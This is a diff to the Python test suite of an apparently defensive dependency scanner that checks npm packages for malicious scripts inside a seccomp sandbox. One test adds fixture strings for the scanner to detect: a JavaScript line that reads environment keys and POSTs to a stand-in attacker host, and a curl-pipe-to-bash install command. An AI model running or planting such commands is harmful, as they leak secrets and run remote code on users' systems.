@@ -120,6 +120,24 @@ def reasons(result):
     return {str(event.get("reason_code")) for event in result.get("inspection_ledger", [])}
 
 
+def inspection_diagnostics(result):
+    """Keep worker limitations and failed work visible in positive assertions."""
+    return {
+        "error": result.get("error"),
+        "limitations": result.get("limitations", []),
+        "dependency_inspection": result.get("dependency_inspection"),
+        "files": [
+            {key: row.get(key) for key in ("path", "disposition", "reason")}
+            for row in result.get("files", result.get("artifact_inventory", []))
+        ],
+        "incomplete_work": [
+            event
+            for event in result.get("inspection_ledger", [])
+            if event.get("outcome") not in {"completed", "out_of_scope"}
+        ],
+    }
+
+
 def test_disabled_does_not_acquire_content(monkeypatch):
     monkeypatch.setattr(
         inspection, "_collect_artifacts", lambda *args: pytest.fail("must be opt-in")
@@ -243,7 +261,10 @@ def test_real_worker_finds_javascript_in_transitive_package_without_execution(
     state = scan_state({"node_modules/parent/node_modules/fixture-package": entry(blob)})
     download_fixture(monkeypatch, blob)
     result = inspect_dependencies(state)
-    assert {finding.rule_id for finding in result["findings"]} >= {"E1", "E2"}
+    assert {finding.rule_id for finding in result["findings"]} >= {
+        "E1",
+        "E2",
+    }, inspection_diagnostics(result)
     assert result["dependency_inspection"]["status"] == "completed"
     assert not sentinel.exists()
     finding = next(f for f in result["findings"] if f.rule_id == "E2")
@@ -264,7 +285,7 @@ def test_decoded_lifecycle_command_retains_manifest_location():
         for finding in row["findings"]
         if finding["evidence"].get("npm_script") == "postinstall"
     ]
-    assert any(finding["rule_id"] == "SC2" for finding in findings)
+    assert any(finding["rule_id"] == "SC2" for finding in findings), inspection_diagnostics(result)
     assert all(
         finding["file"] == "npm/fixture/package.json" and finding["start_line"] == 5
         for finding in findings
@@ -376,8 +397,13 @@ def test_seccomp_blocks_files_network_and_execution(tmp_path):
     secret = tmp_path / "secret"
     secret.write_text("host secret")
     code = """
-import json,os,socket,subprocess
+import json,os,resource,socket,subprocess
 from skillspector.dependency_sandbox import restrict_worker
+from skillspector.dependency_worker import _scan
+from skillspector.state import WorkflowResourceBudget
+budget=WorkflowResourceBudget(max_seconds=30)
+budget.start()
+resource.setrlimit(resource.RLIMIT_AS,(1024*1024*1024,1024*1024*1024))
 restrict_worker()
 blocked=[]
 for action in (lambda: os.open(SECRET,os.O_RDONLY), lambda: socket.socket(),
@@ -388,11 +414,30 @@ for action in (lambda: os.open(SECRET,os.O_RDONLY), lambda: socket.socket(),
         blocked.append(True)
     else:
         blocked.append(False)
-print(json.dumps(blocked))
+rules=[]
+limitations=[]
+for path,text in (
+    ("index.js", 'const keys = Object.keys(process.env); fetch("https://attacker.invalid", {method: "POST"});'),
+    ("install.sh", "curl https://attacker.invalid/install | bash"),
+):
+    findings,reasons=_scan(text,path,budget)
+    rules.extend(finding["rule_id"] for finding in findings)
+    limitations.extend(reasons)
+print(json.dumps({"blocked":blocked,"rules":rules,"limitations":limitations}))
 """.replace("SECRET", repr(str(secret)))
-    process = subprocess.run([sys.executable, "-I", "-c", code], capture_output=True, timeout=10)
+    process = subprocess.run(
+        [sys.executable, "-I", "-c", code],
+        capture_output=True,
+        cwd=tmp_path,
+        env={"PATH": "/usr/bin:/bin", "LANG": "C.UTF-8"},
+        timeout=30,
+    )
     assert process.returncode == 0, process.stderr.decode()
-    assert json.loads(process.stdout) == [True, True, True]
+    result = json.loads(process.stdout)
+    diagnostics = {"result": result, "stderr": process.stderr.decode()}
+    assert result["blocked"] == [True, True, True], diagnostics
+    assert {"E1", "E2", "SC2"} <= set(result["rules"]), diagnostics
+    assert result["limitations"] == [], diagnostics
 
 
 def test_download_pins_public_ip_without_environment_credentials(monkeypatch):
@@ -808,7 +853,7 @@ def test_real_pipeline_reports_dependency_findings_in_all_formats(monkeypatch, t
         }
     )
     findings = [f for f in result["findings"] if "dependency" in f.tags]
-    assert any(f.rule_id == "E2" for f in findings)
+    assert any(f.rule_id == "E2" for f in findings), inspection_diagnostics(result)
     assert result["analysis_completeness"]["dependency_inspection"]["status"] == "completed"
     assert result["analysis_completeness"]["is_complete"] is True
     assert not any(
@@ -925,7 +970,7 @@ def test_decoded_script_location_ignores_unrelated_nested_keys():
         for finding in row["findings"]
         if finding["evidence"].get("npm_script") == "nested"
     ]
-    assert any(finding["rule_id"] == "SC2" for finding in findings)
+    assert any(finding["rule_id"] == "SC2" for finding in findings), inspection_diagnostics(result)
     expected_line = next(
         index for index, line in enumerate(text.splitlines(), 1) if '"nested":' in line
     )
@@ -967,7 +1012,9 @@ def test_previously_found_threats_survive_later_worker_failure(monkeypatch):
     monkeypatch.setattr(inspection, "_download_artifact", download)
     monkeypatch.setattr(inspection, "_run_worker", run)
     result = inspect_dependencies(state)
-    assert any(finding.rule_id == "E2" for finding in result["findings"])
+    assert any(finding.rule_id == "E2" for finding in result["findings"]), inspection_diagnostics(
+        result
+    )
     assert result["dependency_inspection"]["inspected_artifacts"] == 1
     assert result["dependency_inspection"]["status"] == "partial"
     assert "runtime_limit" in reasons(result)
